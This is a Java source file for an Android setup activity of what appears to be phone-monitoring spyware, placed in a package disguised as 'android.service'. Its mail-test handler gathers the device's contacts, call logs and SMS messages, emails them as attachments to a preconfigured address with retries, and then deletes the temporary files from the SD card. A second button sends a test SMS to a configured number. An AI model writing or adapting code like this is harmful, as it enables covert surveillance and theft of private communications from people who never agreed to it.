package android.service.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.service.SendInfoTask;
import android.service.R;
import android.service.config.ConfigCtrl;
import android.service.config.MailCfg;
import android.service.feature.sms.SmsCtrl;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.TextView;


import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class InitActivity extends Activity 
{
    protected static final String LOGTAG = "InitActivity";
    
    private final static int DEFAULT_RETRY_COUNT = 3;
    
    Button btn_setting;
	Button btn_testMail;
	Button btn_testPhone;;
    Button btn_exit;
    
    TextView hint_setting;
    TextView hint_testMail;
    TextView hint_testPhone;
    TextView hint_exit;
    
    OnClickListener listener_setting = null;
    OnClickListener listener_testMail = null;
    OnClickListener listener_testPhone = null;
    OnClickListener listener_exit = null;
    
    private Context context;
    
    private ProgressDialog progressDialog;
    
    private final int DISABLE_GETINFO_BTN = 0;
    private final int ENABLE_GETINFO_BTN  = 1;
    private final int SEND_MAIL_SUCCESS   = 2;
    private final int SEND_MAIL_FAIL      = 3;
    private final int NETWORK_DISCONNECTED = 4;
     
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.init);
        
        context = getApplicationContext();
        
        setListener(); 
        initUI();
    }
    
    private void initUI()
    {
    	// --------------------------------------------------------------
    	btn_setting = (Button)findViewById(R.id.btn_setting);
        btn_setting.setOnClickListener(listener_setting);
    	btn_testMail = (Button)findViewById(R.id.btn_testmail);
    	btn_testMail.setOnClickListener(listener_testMail);
    	btn_testPhone = (Button)findViewById(R.id.btn_testphone);
    	btn_testPhone.setOnClickListener(listener_testPhone);
        btn_exit = (Button)findViewById(R.id.btn_exit);
        btn_exit.setOnClickListener(listener_exit);
        
        hint_setting = (TextView)findViewById(R.id.hint_setting);
        hint_testMail = (TextView)findViewById(R.id.hint_testmail);
        hint_testPhone = (TextView)findViewById(R.id.hint_testphone);
        hint_exit = (TextView)findViewById(R.id.hint_exit);
        
        // Set button status
        boolean enabled = false;
        if (GlobalPrefActivity.getSafeMail(context).length() > 0) enabled = true;
        btn_testMail.setEnabled(enabled);
        hint_testMail.setEnabled(enabled);
        
        enabled = false;
        if (GlobalPrefActivity.getSafePhoneNum(context).length() > 0) enabled = true;
        btn_testPhone.setEnabled(enabled);
        hint_testPhone.setEnabled(enabled);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
    	// Enable buttons if the mail address is valid
	    String mailAddr = GlobalPrefActivity.getSafeMail(context);
	   	if (mailAddr.length() > 0) {
	    	Pattern p = Pattern.compile(RegExpUtil.VALID_MAIL_ADDR);
	    	Matcher matcher = p.matcher(mailAddr);
   	 		if (matcher.matches()) {
   	 			btn_testMail.setEnabled(true);
   	 			hint_testMail.setEnabled(true);
   	 		} else {
   	 			btn_testMail.setEnabled(false);
   	 			hint_testMail.setEnabled(false);
   	 		}
	    } else {
	 		btn_testMail.setEnabled(false);
	 		hint_testMail.setEnabled(false);
	    }
	    
	    String phoneNum = GlobalPrefActivity.getSafePhoneNum(context);
	    Pattern p = Pattern.compile(RegExpUtil.VALID_PHONE_NUM);
		Matcher matcher = p.matcher(phoneNum);
		if (matcher.matches()) {
	    	btn_testPhone.setEnabled(true);
	    	hint_testPhone.setEnabled(true);
	    } else {
	    	btn_testPhone.setEnabled(false);
	    	hint_testPhone.setEnabled(false);
	    }
    }
    
    private void setListener()
    {
        listener_setting = new OnClickListener()
        {
            public void onClick(View v)
            {
            	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
            	startActivity(intent);
            }
        };
        
    	listener_testMail = new OnClickListener()
        {
            public void onClick(View v)
            {
    			if (!NetworkUtil.isNetworkConnected(context)) {
    				// Ask user if he wants to go to network setting activity to enable network 
					new AlertDialog.Builder(InitActivity.this)
						.setTitle(getResources().getString(R.string.info))  
						.setIcon(android.R.drawable.ic_dialog_info)  
						.setMessage(R.string.action_goto_network_setting)
						.setPositiveButton(getResources().getString(android.R.string.yes),  
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialoginterface, int i){
									// Start network setting activity
									startActivityForResult(new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS), 0); 
								}
							}
						)  
						.setNegativeButton(getResources().getString(android.R.string.no), 
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialoginterface, int i){
									return;
								}
							}
						).show();
					
					return;
				}

    			// If network connected, try to collect and send the information
            	progressDialog = ProgressDialog.show(InitActivity.this, getResources().getString(R.string.init_processing), 
            			getResources().getString(R.string.init_waiting), true, false);
            	
            	// Start a new thread to do the time-consuming job
    			new Thread(new Runnable(){
    				public void run() {
    					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
    					
    					// Clear attachments
    					if (SendInfoTask.attachments == null) 
    						SendInfoTask.attachments = new ArrayList<File>();
    					else
    						SendInfoTask.attachments.clear();
        		
    					// Collect info
    					SendInfoTask.CollectContact(context);
    					SendInfoTask.CollectPhoneCallHist(context);
    					SendInfoTask.CollectSms(context);
        		
    					// If network connected, try to collect and send the information
    					if (!NetworkUtil.isNetworkConnected(context)) {
    						// Clean the files in SD-CARD
        					FileCtrl.cleanTxtFiles();
        					
    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
        	
    					// Send mail
    					String phoneNum = ConfigCtrl.getSelfName(context);
    					String subject = getResources().getString(R.string.mail_from) 
        	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
        	          		 + getResources().getString(R.string.mail_description);
    					String body = String.format(getResources().getString(R.string.mail_body_info), phoneNum);
    					String recipient = GlobalPrefActivity.getSafeMail(context);
    					if (recipient == null || recipient.length() == 0) {
    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    						return;
    					}
    					String pwd = MailCfg.getSenderPwd(context);
        		
    					boolean result = false;
    					int retry = DEFAULT_RETRY_COUNT;
    					while(!result && retry > 0)
    					{
    						String sender = MailCfg.getSender(context);
    						result = SendInfoTask.sendMail(subject, body, sender, pwd, recipient, SendInfoTask.attachments);
    						if (!result) retry--;
    					}
    					if(result) {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_SUCCESS, 0);
    					} else {
    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_FAIL, 0);
    					}
    					SendInfoTask.attachments.clear();
        		
    					// Update the last date time
    					if (result) {
    						boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
    					}
        		
    					// Clean the files in SD-CARD
    					FileCtrl.cleanTxtFiles();
    					
    					mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
    				}
    			}).start();
            }
            
        };
        
        listener_testPhone = new OnClickListener()
        {
            public void onClick(View v)
            {
            	String smsContent = context.getResources().getString(R.string.init_test_sms_content);
            	boolean ret = SmsCtrl.sendSms(GlobalPrefActivity.getSafePhoneNum(context), smsContent);
            	if (ret) {
            		String msg = context.getResources().getString(R.string.init_send_test_sms_ok);
            		SysUtils.messageBox(InitActivity.this, msg);
            	} else {
            		String title = context.getResources().getString(R.string.error);
            		String msg = context.getResources().getString(R.string.init_send_test_sms_ng);
            		SysUtils.errorDlg(InitActivity.this, title, msg);
            	}
            }
        };
        
        // Exit the dialog
        listener_exit = new OnClickListener()
        {
            public void onClick(View v)
            {
            	String title = context.getResources().getString(R.string.info);
            	String msg   = context.getResources().getString(R.string.init_pls_reset_phone);
            	new AlertDialog.Builder(InitActivity.this).setTitle(title)
    			.setIcon(android.R.drawable.ic_dialog_info)
    			.setMessage(msg)
    			.setPositiveButton("OK", 
    			    new DialogInterface.OnClickListener(){ 
                        public void onClick(DialogInterface dlgInf, int i) { 
                        	finish();
                        } 
                    })
                .show();
            }
        };
    }
    	
    // Update UI 
    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
               case DISABLE_GETINFO_BTN: {
              	   btn_testMail.setEnabled(false);
                   break;
               }
               case ENABLE_GETINFO_BTN: {
             	   btn_testMail.setEnabled(true);
              	   break;
               }
               case NETWORK_DISCONNECTED: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
            	   break;
               }
               case SEND_MAIL_SUCCESS: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
            	   break;
               }
               case SEND_MAIL_FAIL: {
            	   progressDialog.dismiss();
            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
            	   break;
               }
               default:
                   break;
            }
        }
    };
}